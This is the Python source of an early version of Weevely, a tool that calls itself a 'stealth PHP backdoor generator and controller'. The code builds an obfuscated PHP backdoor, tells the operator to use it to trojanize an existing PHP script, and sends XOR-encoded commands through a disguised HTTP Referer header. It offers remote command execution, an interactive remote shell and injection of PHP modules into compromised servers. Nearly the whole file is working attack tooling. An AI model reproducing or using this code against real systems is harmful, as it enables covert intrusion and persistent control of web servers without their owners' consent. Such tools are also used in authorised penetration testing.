#!/usr/bin/env python
# -*- coding: utf-8 -*-

from numpy import frombuffer, bitwise_xor, byte
import getopt, sys, base64, os, urllib2, re, urlparse, os
    
class weevely:
  
  modules = {}
  
  def main(self):
    
    self.banner()
    self.loadmodules()
  
    try:
	opts, args = getopt.getopt(sys.argv[1:], 'ltgm:c:u:p:o:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output'])
    except getopt.error, msg:
	print "Error:", msg
	exit(2)
    
    for o, a in opts:
	if o in ("-g", "-generate"):
	  moderun='g'
	if o in ("-t", "-terminal"):
	  moderun='t'
	if o in ("-l", "-list"):
	  moderun='l'
	if o in ("-c", "-command"):
	  cmnd=a
	  moderun='c'
	if o in ("-m", "-module"):
	  modul=a
	  moderun='m'
	  
	if o in ("-u", "-url"):
	  url=a
	  parsed=urlparse.urlparse(url)
	  if not parsed.scheme:
	    url="http://"+url
	  if not parsed.netloc:
	    print "- Error: URL not valid"
	    sys.exit(1)
	  
	if o in ("-p", "-password"):
	  pwd=a
	if o in ("-o", "-output"):
	  outfile=a

    if 'moderun' in locals():

      if moderun=='c' or moderun=='t' or moderun=='m':
	if 'url' not in locals():
	  print "! Please specify URL (-u)"
	  sys.exit(1)
	  
      if moderun=='g':
	if 'outfile' not in locals():
	  print "! Please specify where generate backdoor file (-o)"
	  sys.exit(1)

      if 'pwd' not in locals() and moderun!='l':
	if moderun=='g':
	  print "+ Be careful: password is transmitted unencrypted as a fake url parameter.\n+ Random alphanumeric password (like 'a33k44') are less detectable."
	  
	pwd=''
	while not pwd:
	  print "+ Please insert password: ",
	  pwd = sys.stdin.readline().strip()

      if moderun=='c':       
	try:
	  print self.execute(url, pwd, cmnd, 0)
	except Exception, e:
	  print '! Command execution failed: ' + str(e) + '.'
	return

      if moderun=='t':
	self.terminal(url,pwd)
      if moderun=='g':
	self.generate(pwd,outfile)
      if moderun=='m':
	self.execmodule(url,pwd,modul)
      if moderun=='l':
	self.listmodules()
    else:
      self.usage()
      sys.exit(1)

  def usage(self):
    print """+  Generate backdoor crypted code.
+  	./weevely -g -o <filepath> -p <password>
+      
+  Command execution
+  	./weevely -c <command> -u <url> -p <password>
+      
+  Terminal session
+  	./weevely -t -u <url> -p <password>
+
+  List available modules
+  	./weevely -l
+
+  Execute local PHP on remote server, with arguments.
+  	./weevely -m <module>:<firstarg>:..:<secondarg> -u <url> -p <password>"""
    
  def banner(self):
    print "+ Weevely - stealth PHP backoor generator and controller.\n+\t\t\tEmilio Pinna & Carlo Satta.\n+"

     
  def crypt(self, text, key):
    #return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
    text = frombuffer( text, dtype=byte )
    firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
    strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
    strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
    
    bit=((text ^ firstpad) & strrepeat ) | ( text & strrepeat2 )
    
    toret = base64.b64encode(bit.tostring())
    return toret 

  def execute(self, url, pwd, cmnd, mode):
    cmnd=cmnd.strip()
    cmdstr=self.crypt(cmnd,pwd)
    refurl='http://www.google.com/asdsds?dsa=' + pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
    try: 
      ret=self.execHTTPGet(refurl,url)
    except urllib2.URLError, e:
      raise
    else: 
      restring='<' + pwd + '>(.*)</' + pwd + '>'
      e = re.compile(restring,re.DOTALL)
      founded=e.findall(ret)
      if len(founded)<1:
	raise Exception('request doesn\'t produce a valid respond, check password or url')
      else:
	return founded[0].strip()
    
  def execHTTPGet(self, refurl, url):
    req = urllib2.Request(url)
    req.add_header('Referer', refurl)
    r = urllib2.urlopen(req)
    return r.read()
    
  def terminal(self, url, pwd):
    
    hostname=urlparse.urlparse(url)[1]
    
    try:
      ret = self.execute(url, pwd, "echo " + pwd, 0)
    except Exception, e:
      print '! Backdoor verification failed: ' + str(e) + '.'
      return
    
    if pwd!=ret:
      print '! Backdoor verification failed.'
      return
    else:
      while True:
	print hostname + '> ',
	cmnd = sys.stdin.readline()
	if cmnd!='\n':
	  print self.execute(url, pwd, cmnd, 0)

  def generate(self,key,path):
    f_tocrypt = file('php/text_to_crypt.php')
    f_back = file('php/backdoor.php')
    f_output = file(path,'w')
    
    str_tocrypt = f_tocrypt.read()
    str_crypted = self.crypt(str_tocrypt,key)
    str_back = f_back.read()
    new_str = str_back.replace('%%%TEXT-CRYPTED%%%', str_crypted)
    
    f_output.write(new_str)
    print '+ Backdoor file ' + path + ' created with password '+ key + '.\n+ Insert the code to trojanize an existing PHP script, or use the PHP file as is. Exiting.'
     
  def execmodule(self, url, pwd, modulestring):
    
    modname = modulestring.split('::')[0]
    modargs = modulestring.split('::')[1:]
    
    if not self.modules.has_key(modname):
      print '! Module', modname, 'doesn\'t exist. Print list (-l).'
    else:
      m = self.modules[modname]
      if m.has_key('arguments'):
	argnum=len(self.modules[modname]['arguments'])
	if len(modargs)!=argnum:
	  print '! Module', modname, 'takes exactly', argnum, 'arguments.'
	  return
	  
      f = file('modules/' + modname + '.php')
      modargsstring=str(modargs)
      toinject = '$ar=Array(' + modargsstring[1:len(modargsstring)-1] + ');'
      toinject = toinject + f.read()
      
      try:
	ret = self.execute(url, pwd, toinject, 1)
      except Exception, e:
	print '! Module execution failed: ' + str(e) + '.'
	return
      else:
	print ret
    
   
  def listmodules(self):
    
    for n in self.modules.keys():
      m = self.modules[n]
      
      print '+ Module:', m['name'],
      if m.has_key('author'):
	print m['author']
      else:
	print ''
      
      if m.has_key('description'):
	print '  Description:', m['description']
      if m.has_key('arguments'):
	print '  Take', str(len(m['arguments'])), 'argument/s:', ','.join(m['arguments']) + '.'
  
  def loadmodules(self):
    files = os.listdir('modules')
    
    for f in files:
      module={}
      
      if f.endswith('.php'):
	
	  
	mod = file('modules/' + f)
	modstr = mod.read()
	modname = f[:-4]
	module['name']=modname
	
	restring='//.*Author:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['author']=founded[0]

	restring='//.*Description:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['description']=founded[0]
	  
	restring='//.*Arguments:(.*)'
	e = re.compile(restring)
	founded=e.findall(modstr)
	if founded:
	  module['arguments']=founded[0].split(',')

	self.modules[module['name']]=module
     
  
    
if __name__ == "__main__":
    
    
    app=weevely()
    try:
      app.main()
    except KeyboardInterrupt:
      print '\n! Received keyboard interrupt, exiting.'
      
      
    
    
   